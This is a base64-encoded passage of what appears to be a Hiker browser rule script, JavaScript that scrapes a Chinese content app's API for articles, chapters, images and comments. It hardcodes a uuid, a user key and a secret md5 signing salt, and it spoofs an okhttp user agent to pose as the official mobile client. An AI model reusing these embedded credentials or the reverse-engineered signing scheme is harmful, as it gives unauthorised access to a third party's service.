ICAgICAgICBtZXRob2Q6ICdQT1NUJ1xcbiAgICAgICAgfSk7IC8vbG9nKGh0bWwpXFxuICAgICAgICB2YXIgaHRtbDEgPSBhcGl2aWV3LkRlY3J5cHQoaHRtbCk7IC8vbG9nKGh0bWwxKVxcbiAgICAgICAgLy92YXIgbG9nZ2VkX2F0ID0gSlNPTi5wYXJzZShodG1sMSkuZGF0YS51c2VyLmxvZ2dlZF9hdC5zcGxpdCgnICcpWzBdOyBsb2cobG9nZ2VkX2F0KVxcbiAgICAgICAgdmFyIHRva2VuID0gSlNPTi5wYXJzZShodG1sMSkuZGF0YS51c2VyLnRva2VuOyBsb2codG9rZW4pXFxuICAgICAgICAvL3NldEl0ZW0oXFxcImxvZ2dlZF9hdFxcXCIsbG9nZ2VkX2F0KVxcbiAgICAgICAgc2V0SXRlbShcXFwidG9rZW5cXFwiLHRva2VuKVxcbiAgICB9LFxcbiAgICBnZXRodG1sOiAodXJsLGJvZHkpID0+IHtcXG4gICAgICAgIHZhciBodG1sID0gZmV0Y2godXJsLCB7XFxuICAgICAgICAgICAgaGVhZGVyczoge1xcbiAgICAgICAgICAgICAgICAndXVpZCc6ICdjOWFkMjIxZi1iNDQ1LTM5ZDItODVmNS1hNjkzYzI0MTE1ZTMnLFxcbiAgICAgICAgICAgICAgICAndGltZXN0YW1wJzogYXBpdmlldy50MTAoKSxcXG4gICAgICAgICAgICAgICAgJ2lwJzogJzAuMC4wLjAnLFxcbiAgICAgICAgICAgICAgICAndXNlci1rZXknOiAnNzYwMzU1Y2M4ODIxOGYwYzE1MTRmNTY3NjQzNjIwNjYnLFxcbiAgICAgICAgICAgICAgICAncGxhdGZvcm0nOiAnMScsXFxuICAgICAgICAgICAgICAgICdzaWduJzogbWQ1KG1kNSgnMC4wLjAuMC4xLicrYXBpdmlldy50MTAoKSsnLjc2MDM1NWNjODgyMThmMGMxNTE0ZjU2NzY0MzYyMDY2LmM5YWQyMjFmLWI0NDUtMzlkMi04NWY1LWE2OTNjMjQxMTVlMycpKydtNG4yaGpQZVlXa0Q2dEZwcUtGXjNIT15oMjRQQGlkVCcpLFxcbiAgICAgICAgICAgICAgICAnYXBwLXZlcnNpb24nOiAnMi4yLjknLFxcbiAgICAgICAgICAgICAgICAndG9rZW4nOiBnZXRJdGVtKFxcXCJ0b2tlblxcXCIpLFxcbiAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsXFxuICAgICAgICAgICAgICAgICdDb250ZW50LUxlbmd0aCc6ICcwJyxcXG4gICAgICAgICAgICAgICAgJ0hvc3QnOiBhcGl2aWV3Lmhvc3Quc3BsaXQoJy8vJylbMV0sXFxuICAgICAgICAgICAgICAgICdDb25uZWN0aW9uJzogJ0tlZXAtQWxpdmUnLFxcbiAgICAgICAgICAgICAgICAvLydBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCcsXFxuICAgICAgICAgICAgICAgICdVc2VyLUFnZW50JzogJ29raHR0cC80LjMuMScsXFxuICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICBib2R5OiBib2R5LCAgICAgICAgICAgIFxcbiAgICAgICAgICAgIG1ldGhvZDogJ1BPU1QnLFxcbiAgICAgICAgICAgIHJlamVjdENvZGluZzogdHJ1ZVxcbiAgICAgICAgfSk7IC8vbG9nKGh0bWwpXFxuICAgICAgICB2YXIgaHRtbDEgPSBhcGl2aWV3LkRlY3J5cHQoaHRtbCk7IC8vbG9nKGh0bWwxKVxcbiAgICAgICAgcmV0dXJuIGh0bWwxXFxuICAgIH0sXFxuICAgIHR1d2VueWlqaTogKGQsZGF0YSkgPT4ge1xcbiAgICAgICAgZGF0YS5mb3JFYWNoKGl0ZW0gPT4ge1xcbiAgICAgICAgICAgIHZhciBpbWcgPSBhcGl2aWV3LkRlY3J5cHQxKCdodHRwczovL2ptdHAuZ3BncmVpaS5jb20nICsgaXRlbS50aHVtYilcXG4gICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogaXRlbS5wdWJsaXNoZWRfYXQuc3BsaXQoJyAnKVswXSxcXG4gICAgICAgICAgICAgICAgaW1nOiBpbWcsXFxuICAgICAgICAgICAgICAgIHVybDogYGhpa2VyOi8vcGFnZS9lcmppP3BhZ2U9ZnlwYWdlI25vSGlzdG9yeSMjZ2FtZVRoZW1lI2AsXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnbW92aWVfMicsXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICBtb2RlbF9pZDogaXRlbS5tb2RlbF9pZCxcXG4gICAgICAgICAgICAgICAgICAgIGlkOiBpdGVtLmlkLFxcbiAgICAgICAgICAgICAgICAgICAgaW1nOiBpbWdcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pXFxuICAgICAgICB9KVxcbiAgICB9LFxcbiAgICB5dWVkdXlpamk6IChkLGRhdGEpID0+IHtcXG4gICAgICAgIGRhdGEuZm9yRWFjaChpdGVtID0+IHtcXG4gICAgICAgICAgICB2YXIgaW1nID0gYXBpdmlldy5EZWNyeXB0MSgnaHR0cHM6Ly9qbXRwLmdwZ3JlaWkuY29tJyArIGl0ZW0udGh1bWIpXFxuICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGl0ZW0udGl0bGUgKyAnXFxcXG4nICsgaXRlbS5hdXRob3IsXFxuICAgICAgICAgICAgICAgIGRlc2M6IGl0ZW0uZGVzY3JpcHRpb24sXFxuICAgICAgICAgICAgICAgIGltZzogaW1nLFxcbiAgICAgICAgICAgICAgICB1cmw6IGBoaWtlcjovL3BhZ2UvZXJqaT9wYWdlPWZ5cGFnZSNub0hpc3RvcnkjI2dhbWVUaGVtZSNgLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ21vdmllXzFfbGVmdF9waWMnLFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgbW9kZWxfaWQ6IGl0ZW0ubW9kZWxfaWQsXFxuICAgICAgICAgICAgICAgICAgICBpZDogaXRlbS5pZCxcXG4gICAgICAgICAgICAgICAgICAgIGltZzogaW1nXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KVxcbiAgICAgICAgfSlcXG4gICAgfSxcXG4gICAgeWluZ3NoaXlpamk6IChkLGRhdGEpID0+IHtcXG4gICAgICAgIGRhdGEuZm9yRWFjaChpdGVtID0+IHtcXG4gICAgICAgICAgICB2YXIgaW1nID0gYXBpdmlldy5EZWNyeXB0MSgnaHR0cHM6Ly9qbXRwLmdwZ3JlaWkuY29tJyArIGl0ZW0udGh1bWIpXFxuICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGl0ZW0udGl0bGUsXFxuICAgICAgICAgICAgICAgIGRlc2M6IGl0ZW0uZGVzY3JpcHRpb24sXFxuICAgICAgICAgICAgICAgIGltZzogaW1nLFxcbiAgICAgICAgICAgICAgICB1cmw6IGBoaWtlcjovL3BhZ2UvZXJqaT9wYWdlPWZ5cGFnZSNub0hpc3RvcnkjI2dhbWVUaGVtZSNgLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ21vdmllXzFfbGVmdF9waWMnLFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgbW9kZWxfaWQ6IGl0ZW0ubW9kZWxfaWQsXFxuICAgICAgICAgICAgICAgICAgICBpZDogaXRlbS5pZCxcXG4gICAgICAgICAgICAgICAgICAgIGltZzogaW1nXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KVxcbiAgICAgICAgfSlcXG4gICAgfSxcXG4gICAgZGlhbnRhaXlpamk6IChkLGRhdGEpID0+IHtcXG4gICAgICAgIGRhdGEuZm9yRWFjaChpdGVtID0+IHtcXG4gICAgICAgICAgICB2YXIgaW1nID0gYXBpdmlldy5EZWNyeXB0MSgnaHR0cHM6Ly9qbXRwLmdwZ3JlaWkuY29tJyArIGl0ZW0udGh1bWIpXFxuICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGl0ZW0udGl0bGUsXFxuICAgICAgICAgICAgICAgIGRlc2M6ICcwJyxcXG4gICAgICAgICAgICAgICAgaW1nOiBpbWcsXFxuICAgICAgICAgICAgICAgIHVybDogYGhpa2VyOi8vcGFnZS9lcmppP3BhZ2U9ZnlwYWdlI25vSGlzdG9yeSMjZ2FtZVRoZW1lI2AsXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnY2FyZF9waWNfMScsXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICBtb2RlbF9pZDogaXRlbS5tb2RlbF9pZCxcXG4gICAgICAgICAgICAgICAgICAgIGlkOiBpdGVtLmlkLFxcbiAgICAgICAgICAgICAgICAgICAgaW1nOiBpbWdcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pXFxuICAgICAgICB9KVxcbiAgICB9LFxcbiAgICB4aWV6aGVubWFuaHVheWlqaTogKGQsZGF0YSkgPT4ge1xcbiAgICAgICAgZGF0YS5mb3JFYWNoKGl0ZW0gPT4ge1xcbiAgICAgICAgICAgIHZhciBpbWcgPSBhcGl2aWV3LkRlY3J5cHQxKCdodHRwczovL2ptdHAuZ3BncmVpaS5jb20nICsgaXRlbS50aHVtYilcXG4gICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogaXRlbS50aXRsZSxcXG4gICAgICAgICAgICAgICAgZGVzYzogJzAnLFxcbiAgICAgICAgICAgICAgICBpbWc6IGltZyxcXG4gICAgICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5JyArIGl0ZW0uaWQpLnJ1bGUoKCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgdmFyIGFwaXZpZXcgPSAkLnJlcXVpcmUoXFxcImhhbnNodVxcXCIpXFxuICAgICAgICAgICAgICAgICAgICB2YXIgdXJsID0gYXBpdmlldy5ob3N0KycvdjIuNS9zZXJpZXMvY2hhcHRlcnMnXFxuICAgICAgICAgICAgICAgICAgICB2YXIgYm9keSA9IGFwaXZpZXcuRW5jcnlwdCgnc2VyaWVzX2lkPScgKyBNWV9VUkwucmVwbGFjZSgnaGlrZXI6Ly9lbXB0eScsICcnKSlcXG4gICAgICAgICAgICAgICAgICAgIHZhciBkYXRhID0gSlNPTi5wYXJzZShhcGl2aWV3LmdldGh0bWwodXJsLCBib2R5KSkuZGF0YTsgLy9sb2coZGF0YSlcXG4gICAgICAgICAgICAgICAgICAgIHZhciBkID0gW107XFxuICAgICAgICAgICAgICAgICAgICBkYXRhLmNoYXB0ZXJzLmZvckVhY2goaXRlbSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGltZyA9IGFwaXZpZXcuRGVjcnlwdDEoJ2h0dHBzOi8vam10cC5ncGdyZWlpLmNvbScgKyBpdGVtLnRodW1iKVxcbiAgICAgICAgICAgICAgICAgICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBpdGVtLnRpdGxlLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZXNjOiBpdGVtLmRlc2NyaXB0aW9uLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbWc6IGltZyxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBgaGlrZXI6Ly9wYWdlL2Vyamk/cGFnZT1meXBhZ2Ujbm9IaXN0b3J5IyNnYW1lVGhlbWUjYCxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6ICdtb3ZpZV8xX2xlZnRfcGljJyxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1vZGVsX2lkOiAyLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWQ6IGl0ZW0uaWQsXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbWc6IGltZ1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgICAgICAgICBzZXRSZXN1bHQoZClcXG4gICAgICAgICAgICAgICAgfSksXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnY2FyZF9waWNfMSdcXG4gICAgICAgICAgICB9KVxcbiAgICAgICAgfSlcXG4gICAgfSxcXG4gICAgdHV3ZW46IChkLGRhdGEpID0+IHtcXG4gICAgICAgIHZhciBpbWdzID0gZGF0YS5jb250ZW50LnJlcGxhY2UoLyg8ZmlndXJlW1xcXFxTXFxcXHNdKj88XFxcXC9maWd1cmU+KS9nLCBcXFwiQCQxQFxcXCIpO1xcbiAgICAgICAgaW1ncy5zcGxpdChcXFwiQFxcXCIpLmZvckVhY2goaXQgPT4ge1xcbiAgICAgICAgICAgIGlmIChpdC5pbmNsdWRlcyhcXFwiZmlndXJlXFxcIikpIHtcXG4gICAgICAgICAgICAgICAgbGV0IGltZyA9IGFwaXZpZXcuRGVjcnlwdDEoJ2h0dHBzOi8vam10cC5ncGdyZWlpLmNvbScgKyBwZGZoKGl0LCBcXFwiaW1nJiZzcmNcXFwiKSlcXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgIC8vZGVzYzogJzAnLFxcbiAgICAgICAgICAgICAgICAgICAgaW1nOiBpbWcsXFxuICAgICAgICAgICAgICAgICAgICB1cmw6IGltZyxcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiAncGljXzFfZnVsbCdcXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgfSBlbHNlIGlmIChpdC50cmltKCkpIHtcXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBpdCxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogJ2hpa2VyOi8vZW1wdHknLFxcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6ICdyaWNoX3RleHQnXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0pXFxuICAgIH0sXFxuICAgIGJpYW9xaWFuOiAoZCxkYXRhKSA9PiB7XFxuICAgICAgICBkYXRhLnRhZ3MuZm9yRWFjaChpdGVtID0+IHtcXG4gICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogaXRlbSxcXG4gICAgICAgICAgICAgICAgdXJsOiAkKGl0ZW0gKyAnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAvL3B1dE15VmFyKCdzZWFyY2gnLCBpbnB1dClcXG4gICAgICAgICAgICAgICAgICAgIC8vcmVmcmVzaFBhZ2UoKVxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgICAgICAgICB9KSxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdmbGV4X2J1dHRvbidcXG4gICAgICAgICAgICB9KVxcbiAgICAgICAgfSlcXG4gICAgfSxcXG4gICAgeXVsYW50dTogKGQsZGF0YSkgPT4ge1xcbiAgICAgICAgZGF0YS5tdWx0aXBsZV9waWMuZm9yRWFjaChpdGVtID0+IHtcXG4gICAgICAgICAgICBsZXQgaW1nID0gYXBpdmlldy5EZWNyeXB0MSgnaHR0cHM6Ly9qbXRwLmdwZ3JlaWkuY29tJyArIGl0ZW0pXFxuICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgaW1nOiBpbWcsXFxuICAgICAgICAgICAgICAgIHVybDogaW1nLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ2NhcmRfcGljXzMnXFxuICAgICAgICAgICAgfSlcXG4gICAgICAgIH0pXFxuICAgIH0sXFxuICAgIHBpbmdsdW46IChkLCBkYXRhKSA9PiB7XFxuICAgICAgICBkYXRhLmZvckVhY2goZGF0YSA9PiB7XFxuICAgICAgICAgICAgaWYgKGRhdGEuYXV0aG9yKSB7XFxuICAgICAgICAgICAgICAgIGlmIChkYXRhLmF2YXRhciA9PSAnJykge1xcbiAgICAgICAgICAgICAgICAgICAgdmFyIGF2YXRhciA9ICdodHRwczovL2ltZy52aW51YS5jbi9pbWFnZXMvSW5uRGsudGgucG5nJ1xcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICAgICAgdmFyIGF2YXRhciA9IGFwaXZpZXcuRGVjcnlwdDEoJ2h0dHBzOi8vam10cC5ncGdyZWlpLmNvbScgKyBkYXRhLmF2YXRhcilcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGRhdGEuYXV0aG9yLFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogZGF0YS5jcmVhdGVkX2F0LFxcbiAgICAgICAgICAgICAgICAgICAgaW1nOiBhdmF0YXIsXFxuICAgICAgICAgICAgICAgICAgICB1cmw6ICdoaWtlcjovL2VtcHR5JyxcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnYXZhdGFyJ1xcbiAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICAgICBpZiAoZGF0YS5yZXBsaWVzLmxlbmd0aCAhPSAnMCcpIHtcXG4gICAgICAgICAgICAgICAgICAgIHZhciB0aXRsZSA9IGRhdGEudGV4dCArIGFwaXZpZXcuYWRkcmVzc1RhZygnaGlrZXI6Ly9wYWdlL3Bpbmx1bicsICdcXFxcdFxcXFx0XFxcXHTmn6XnnIvlhajpg6gnKVxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICAgICAgdmFyIHRpdGxlID0gZGF0YS50ZXh0XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBhcGl2aWV3LmdyYXkodGl0bGUpLFxcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6ICdyaWNoX3RleHQnLFxcbiAgICAgICAgICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogZGF0YS5hdXRob3IsXFxuICAgICAgICAgICAgICAgICAgICAgICAgZGVzYzogZGF0YS5jcmVhdGVkX2F0LFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGRlc2MxOiBkYXRhLnRleHQsXFxuICAgICAgICAgICAgICAgICAgICAgICAgaW1nOiBhdmF0YXIsXFxuICAgICAgICAgICAgICAgICAgICAgICAgaXRlbTogZGF0YS5yZXBsaWVzLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHBhZ2VUaXRsZTogZGF0YS5hdXRob3JcXG4gICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KVxcbiAgICB9XFxufVxcblxcbiQuZXhwb3J0cyA9IGFwaXZpZXc7XFxuXCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLngrnmkq1cIixcInBhdGhcIjpcImNsYTFcIixcInJ1bGVcIjpcInZhciBlbmREYXRlID0gXFxcIjIwMjEtMDktMDFcXFwiO1xcbnZhciBoZSA9IGFwaXZpZXcuZ2V0WWVhck1vbnRoQXJyYXkoZW5kRGF0ZSk7IC8vbG9nKGhlKSBcXG52YXIgc3VicyA9IGhlIC8vbG9nKHN1YnMpIFxcbmlmKE1ZX1BBR0UgPT0gJzEnKXtcXG5oZS5mb3JFYWNoKCh4LGkpPT57XFxuICAgIHZhciBjdGl0bGUgPSB4XFxuICAgIHZhciBzdWIgPSBzdWJzW2ldXFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogZ2V0TXlWYXIoJ2N0aXRsZScsIGhlWzBdKSA9PSBjdGl0bGUgPyAn4oCc4oCc4oCd4oCdJytjdGl0bGUuZm9udGNvbG9yKCcjJytnZXRSYW5nZUNvbG9ycygpKTpjdGl0bGUsXFxuICAgICAgICB1cmw6ICQoJyNub0xvYWRpbmcjI25vSGlzdG9yeSMnKS5sYXp5UnVsZSgoY3RpdGxlLHN1YikgPT4ge1xcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiY3RpdGxlXFxcIiwgY3RpdGxlKTtcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcInN1YlxcXCIsc3ViKTtcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgICAgIH0sIGN0aXRsZSxzdWIpLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJzY3JvbGxfYnV0dG9uXFxcIlxcbiAgICB9KVxcbn0pXFxufVxcbnZhciBoZSA9IGdldE15VmFyKFxcXCJjdGl0bGVcXFwiLGhlWzBdKVxcbnZhciBzdWIgPSBnZXRNeVZhcihcXFwic3ViXFxcIixzdWJzWzBdKTsgLy9sb2coc3ViKVxcblxcbnZhciB1cmwgPSBhcGl2aWV3Lmhvc3QrJy92Mi41L2FydGljbGUvZGlzY292ZXJ5J1xcbnZhciBib2R5ID0gYXBpdmlldy5FbmNyeXB0KCdtb2RlbF9pZD02JnB1Ymxpc2hlZF9hdD0nK3N1YisnJnBhZ2U9JytNWV9QQUdFKycmc2l6ZT0yMCZzb3J0PXB1Ymxpc2hlZF9hdCcpXFxudmFyIGRhdGEgPSBKU09OLnBhcnNlKGFwaXZpZXcuZ2V0aHRtbCh1cmwsYm9keSkpLmRhdGE7XFxuZGF0YS5mb3JFYWNoKGl0ZW0gPT4ge1xcbiAgICB2YXIgaW1nID0gYXBpdmlldy5EZWNyeXB0MSgnaHR0cHM6Ly9qbXRwLmdwZ3JlaWkuY29tJyArIGl0ZW0udGh1bWIpXFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogaXRlbS50aXRsZSxcXG4gICAgICAgIGRlc2M6ICcnLFxcbiAgICAgICAgaW1nOiBpbWcsXFxuICAgICAgICB1cmw6IGBoaWtlcjovL3BhZ2UvZXJqaTE/cGFnZT1meXBhZ2Ujbm9IaXN0b3J5I2AsXFxuICAgICAgICBjb2xfdHlwZTogJ3BpY18xX2NhcmQnLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBtb2RlbF9pZDogaXRlbS5tb2RlbF9pZCxcXG4gICAgICAgICAgICBpZDogaXRlbS5pZCxcXG4gICAgICAgICAgICBpbWc6IGltZ1xcbiAgICAgICAgfVxcbiAgICB9KVxcbn0pXCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLngrnmkq3kuoznuqdcIixcInBhdGhcIjpcImVyamkxXCIsXCJydWxlXCI6XCJqczpcXG52YXIgYXBpdmlldyA9ICQucmVxdWlyZShcXFwiaGFuc2h1XFxcIilcXG52YXIgbW9kZWxfaWQgPSBNWV9QQVJBTVMubW9kZWxfaWQ7IC8vbG9nKHR5cGVvZiBtb2RlbF9pZClcXG52YXIgaWQgPSBNWV9QQVJBTVMuaWQ7IC8vbG9nKGlkKVxcbnZhciBpbWcgPSBNWV9QQVJBTVMuaW1nXFxudmFyIGQgPSBbXTtcXG5pZihNWV9QQUdFID09ICcxJyl7XFxuZC5wdXNoKHtcXG4gICAgZGVzYzogJzAnLFxcbiAgICBpbWc6IGltZyxcXG4gICAgdXJsOiBpbWcsXFxuICAgIGNvbF90eXBlOiAnY2FyZF9waWNfMSdcXG59KVxcbmlmKGdldE15VmFyKCdhJykgPT0gJzEnKXtcXG52YXIgdGl0bGUxID0gJ1xcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx05b2x54mH5LuL57uNXFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHQnXFxudmFyIHRpdGxlMiA9ICdcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdOKAmOKAmOeUqOaIt+ivhOS7t+KAmeKAmVxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0J1xcbn1lbHNle1xcbnZhciB0aXRsZTEgPSAnXFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHTigJjigJjlvbHniYfku4vnu43igJnigJlcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdCdcXG52YXIgdGl0bGUyID0gJ1xcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx055So5oi36K+E5Lu3XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHQnXFxufVxcbmQucHVzaCh7XFxuICAgIHRpdGxlOiB0aXRsZTEsXFxuICAgIHVybDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoKT0+e1xcbiAgICAgICAgY2xlYXJNeVZhcignYScpXFxuICAgICAgICByZWZyZXNoUGFnZSgpXFxuICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgIH0pLFxcbiAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXG4gICAgLy9leHRyYTogeydiYWNrZ3JvdW5kQ29sb3InOiAnI0UwRjhGRid9XFxufSlcXG5kLnB1c2goe1xcbiAgICB0aXRsZTogdGl0bGUyLFxcbiAgICB1cmw6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKCk9PntcXG4gICAgICAgIHB1dE15VmFyKCdhJywnMScpXFxuICAgICAgICByZWZyZXNoUGFnZSgpXFxuICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgIH0pLFxcbiAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXG4gICAgLy9leHRyYTogeydiYWNrZ3JvdW5kQ29sb3InOiAnI0UwRjhGRid9XFxufSlcXG59XFxuaWYoZ2V0TXlWYXIoJ2EnKSA9PSAnMScpe1xcbnZhciB1cmwgPSBhcGl2aWV3Lmhvc3QrJy92Mi41L2NvbW1lbnQvbGlzdCdcXG52YXIgYm9keSA9IGFwaXZpZXcuRW5jcnlwdCgnYXJ0aWNsZV9pZD0nK2lkKycmcGFnZT0nK01ZX1BBR0UrJyZzaXplPTIwJnNvcnRpbmc9JytnZXRNeVZhcignYTEnLCdsaWtlcycpKVxcbnZhciBkYXRhID0gSlNPTi5wYXJzZShhcGl2aWV3LmdldGh0bWwodXJsLCBib2R5KSkuZGF0YTsgLy9sb2coZGF0YSlcXG5pZihNWV9QQUdFID09ICcxJyl7XFxuaWYoZ2V0TXlWYXIoJ2ExJywnbGlrZXMnKSA9PSAnbGlrZXMnKXtcXG52YXIgdGV4dCA9ICflvZPliY3mjpLluo/vvJrmjInng63luqYnXFxufVxcbmlmKGdldE15VmFyKCdhMScpID09ICdjcmVhdGVkX2F0Jyl7XFxudmFyIHRleHQgPSAn5b2T5YmN5o6S5bqP77ya5oyJ5pe26Ze0J1xcbn1cXG4vL2xvZyhnZXRNeVZhcignYTEnLCdsaWtlcycpKVxcbnZhciBwYWl4dSA9ICQoJyNub0xvYWRpbmcjJykuYjY0KCkubGF6eVJ1bGUoKCkgPT4ge1xcbiAgICBpZihnZXRNeVZhcignYTEnLCdsaWtlcycpID09ICdsaWtlcycpe1xcbiAgICAgICAgcHV0TXlWYXIoJ2ExJywnY3JlYXRlZF9hdCcpXFxuICAgICAgICB0b2FzdCgn5oyJ5pe26Ze0JylcXG4gICAgICAgIHJlZnJlc2hQYWdlKClcXG4gICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXG4gICAgfVxcbiAgICBpZihnZXRNeVZhcignYTEnKSA9PSAnY3JlYXRlZF9hdCcpe1xcbiAgICAgICAgcHV0TXlWYXIoJ2ExJywnbGlrZXMnKVxcbiAgICAgICAgdG9hc3QoJ+aMieeDreW6picpXFxuICAgICAgICByZWZyZXNoUGFnZSgpXFxuICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgIH1cXG59KVxcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBhcGl2aWV3LmJpZyhhcGl2aWV3LnN0cm9uZygn6K+E6K665YiX6KGoJykpKydcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdCcrYXBpdmlldy5hZGRyZXNzVGFnKHBhaXh1LHRleHQpLFxcbiAgICBjb2xfdHlwZTogJ3JpY2hfdGV4dCcsXFxufSlcXG59XFxuYXBpdmlldy5waW5nbHVuKGQsZGF0YSlcXG59ZWxzZXtcXG5pZihNWV9QQUdFID09ICcxJyl7XFxudmFyIHVybCA9IGFwaXZpZXcuaG9zdCs